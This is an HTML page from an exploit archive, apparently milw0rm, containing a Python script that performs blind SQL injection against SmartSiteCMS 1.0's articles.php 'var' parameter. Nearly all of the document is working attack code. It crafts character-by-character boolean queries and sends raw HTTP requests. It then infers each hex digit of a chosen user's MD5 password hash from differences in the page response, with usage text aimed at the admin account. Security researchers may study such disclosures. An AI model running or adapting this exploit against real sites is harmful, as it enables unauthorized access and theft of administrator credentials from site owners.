<html><head><title>SmartSiteCMS 1.0 (articles.php var) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/python

import sys
import re
from socket import *

class exploit:
	def __init__(self,host,path,user):
		self.host=host
		self.path=path
		self.user=user
		self.reg=re.compile(&quot;&lt;!-- END COMMENT FORM --&gt;&quot;)
	def set_query(self,n,ch):
		self.query=&quot;' OR ASCII(SUBSTRING((SELECT password FROM users WHERE userName='&quot;+self.user+&quot;'),&quot;+str(n)+&quot;,1)) = &quot;+str(ord(ch))+&quot; OR '1'='2&quot;
		self.query = self.query.replace(&quot; &quot;,&quot;%20&quot;)
		self.query = self.query.replace(&quot;'&quot;,&quot;%27&quot;)
		self.request=&quot;GET &quot;+self.path+&quot;/articles.php?var=&quot;+self.query+&quot; HTTP/1.0\r\nHost: &quot;+self.host+&quot;\r\n\n&quot;
	def check(self):
		sock=socket(AF_INET, SOCK_STREAM)
		sock.connect((self.host, 80))
		sock.send(self.request)
		r=&quot;&quot;
		t=&quot;-&quot;
		while(t!=&quot;&quot;):
			t=sock.recv(1024)
			r+=t
		match=self.reg.search(r)
		if(r[match.start()+27:match.start()+59]!=&quot;&lt;!-- END OF RELATED ARTICLES --&gt;&quot;):
			return 1
		else:
			return 0
		sock.close()

print &quot;////*****************************************\\\\\\\\&quot;
print &quot;||||           smartSiteCMS 1.0 v1.0         ||||&quot;
print &quot;||||            Blind SQL injection          ||||&quot;
print &quot;||||					     ||||&quot;
print &quot;|||| ~Author: certaindeath                   ||||&quot;
print &quot;|||| ~Greetz: darkjoker                      ||||&quot;
print &quot;\\\\\\\\*****************************************////\n&quot;

if(len(sys.argv) !=4 ):
	print &quot;Usage:	python xpl.py &lt;host&gt; &lt;cms path&gt; &lt;user&gt;&quot;
	print &quot;Example: python xpl.py localhost /cms admin&quot;
	sys.exit(0)

pwd=&quot;&quot;
xpl = exploit(sys.argv[1],sys.argv[2],sys.argv[3])
n=1
while(n&lt;=32):
	t=0
	xpl.set_query(n,str(t))
	while (xpl.check()!=1):
		t+=1
		xpl.set_query(n,str(hex(t))[-1])
	pwd+=str(hex(t))[-1]
	n+=1
print &quot;pass [md5]: &quot;,pwd

# milw0rm.com [2009-01-28]</pre></html>